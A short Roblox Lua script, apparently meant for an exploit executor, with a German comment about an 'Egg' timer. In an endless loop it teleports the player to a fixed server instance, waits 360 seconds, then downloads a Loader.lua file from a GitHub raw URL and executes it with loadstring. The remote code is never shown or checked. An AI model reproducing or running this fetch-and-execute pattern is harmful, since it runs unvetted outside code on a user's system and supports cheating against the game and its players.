-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 360
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "1f7d6d9f-1133-4b76-9197-e8471150f3cd")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
